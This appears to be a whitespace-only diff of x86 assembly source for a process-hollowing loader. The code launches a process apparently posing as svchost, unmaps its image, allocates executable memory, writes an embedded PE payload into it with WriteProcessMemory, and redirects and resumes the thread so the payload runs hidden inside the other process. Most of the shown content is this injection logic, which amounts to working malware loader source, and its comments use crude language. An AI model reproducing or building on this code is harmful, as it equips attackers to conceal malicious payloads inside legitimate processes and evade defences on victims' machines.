@@ -1,12 +1,12 @@
-%define HIMEM 					0x00800000 + BASE
+%define HIMEM 				0x00800000 + BASE
 
 %define Kernel32Handle			HIMEM + 0x4000
-%define lpProcessInformation	Kernel32Handle + 4
-%define hProcess					lpProcessInformation
-%define hThread						lpProcessInformation + 4
-%define dwProcessId					lpProcessInformation + 8
-%define dwThreadId					lpProcessInformation + 12
-%define NtdllHandle				dwThreadId + 4
+%define lpProcessInformation		Kernel32Handle + 4
+%define hProcess			lpProcessInformation
+%define hThread				lpProcessInformation + 4
+%define dwProcessId			lpProcessInformation + 8
+%define dwThreadId			lpProcessInformation + 12
+%define NtdllHandle			dwThreadId + 4
 %define mThreadContext			NtdllHandle + 4
 %define mThreadContextEbx		mThreadContext + 164
 %define mThreadContextEax		mThreadContext + 176
@@ -21,13 +21,13 @@
 
 
 str_svchost:	db APPNAME,0
-str_ntdll:		db 'ntdll',0
-str_reloc:		db '.reloc'
+str_ntdll:	db 'ntdll',0
+str_reloc:	db '.reloc'
 
 
 %define CreateProcessA			HIMEM + 0x8000
 str_CreateProcessA: 			db 'CreateProcessA',0 
-%define NtUnmapViewOfSection	CreateProcessA + 4
+%define NtUnmapViewOfSection		CreateProcessA + 4
 str_NtUnmapViewOfSection:		db 'NtUnmapViewOfSection',0 
 %define GetThreadContext		NtUnmapViewOfSection + 4
 str_GetThreadContext: 			db 'GetThreadContext',0 
@@ -40,7 +40,7 @@ str_WriteProcessMemory: 		db 'WriteProcessMemory',0
 %define SetThreadContext		WriteProcessMemory + 4
 str_SetThreadContext: 			db 'SetThreadContext',0 
 %define ResumeThread			SetThreadContext + 4
-str_ResumeThread: 				db 'ResumeThread',0 
+str_ResumeThread: 			db 'ResumeThread',0 
 %define WaitForSingleObject		ResumeThread + 4
 str_WaitForSingleObject: 		db 'WaitForSingleObject',0 
 
@@ -146,7 +146,7 @@ _main:
 	push dword [hProcess]
 	call [NtUnmapViewOfSection]
 
-	push 0x40			; PAGE_EXECUTE_READWRITE
+	push 0x40		; PAGE_EXECUTE_READWRITE
 	push 0x00003000		; MEM_COMMIT | MEM_RESERVE
 	push dword [ImageSize]	; Alloc size
 	push dword [mRemoteImageBase]
@@ -154,25 +154,25 @@ _main:
 	call [VirtualAllocEx]
 
 	mov eax, [__end + 0x3c] ; Move offset of PE header start into eax
-	add eax, __end			; Now points to PE header start
+	add eax, __end		; Now points to PE header start
 	
 
 	mov ebx, [eax + 0xA0]	; Check if payload image has relocations
 	cmp ebx, 0
-	jnz _hasRelocNope		; Nope, not touching images with dynamic 
-							; base address! Recompile that shit without
-							; relocations first
+	jnz _hasRelocNope	; Nope, not touching images with dynamic 
+				; base address! Recompile that shit without
+				; relocations first
 
 	mov ebx, [eax + 0x34]	; Base address of payload image
 	mov ecx, [mRemoteImageBase]
 	mov [eax + 0x34], ecx	; Update payload base address
-	sub ecx, ebx			; ecx holds image base delta 
+	sub ecx, ebx		; ecx holds image base delta 
 	mov ebx, [eax + 0x54]	; Size of payload headers
 
-	push eax				; Save eax because we need it again!
-							; Woule be better stored in a different 
-							; register than the one used for 
-							; return values, probably...
+	push eax		; Save eax because we need it again!
+				; Woule be better stored in a different 
+				; register than the one used for 
+				; return values, probably...
 	push 0
 	push ebx
 	push __end
@@ -180,14 +180,14 @@ _main:
 	push dword [hProcess]
 	call [WriteProcessMemory]
 
-	pop eax					; Resore that fucker
+	pop eax			; Resore that fucker
 
 	mov bx, [eax + 0x06]	; number of sections
 	mov ecx, eax
-	add ecx, 0xF8			; move pointer to first section header
+	add ecx, 0xF8		; move pointer to first section header
 	mov edx, [mRemoteImageBase]
 
-_copyNext:					; Copy over all sections to the target
+_copyNext:			; Copy over all sections to the target
 	cmp ebx, 0
 	jle _copyDone
 	call copysec
@@ -204,18 +204,18 @@ _copyDone:
 	; push dword [hThread]
 	; call [GetThreadContext]
 
-	mov eax, [__end + 0x3c] 		; Move offset of PE header start into eax
-	add eax, __end					; Now points to PE header start
-	mov ebx, [mRemoteImageBase]		; Image base of payload
-	add ebx, [eax + 0x28]			; Move pointer forward so the entry point is correct
+	mov eax, [__end + 0x3c] 	; Move offset of PE header start into eax
+	add eax, __end			; Now points to PE header start
+	mov ebx, [mRemoteImageBase]	; Image base of payload
+	add ebx, [eax + 0x28]		; Move pointer forward so the entry point is correct
 	mov [mThreadContextEax], ebx	; Update eax in the target thread context
 	
-	push mThreadContext				; Update the thread context in the target
-	push dword [hThread]			; thread so we can resume execution
+	push mThreadContext		; Update the thread context in the target
+	push dword [hThread]		; thread so we can resume execution
 	call [SetThreadContext]
 
 	push dword [hThread]
-	call [ResumeThread]				; Magic
+	call [ResumeThread]		; Magic
 
 	push 0xffffffff
 	push dword [hThread]
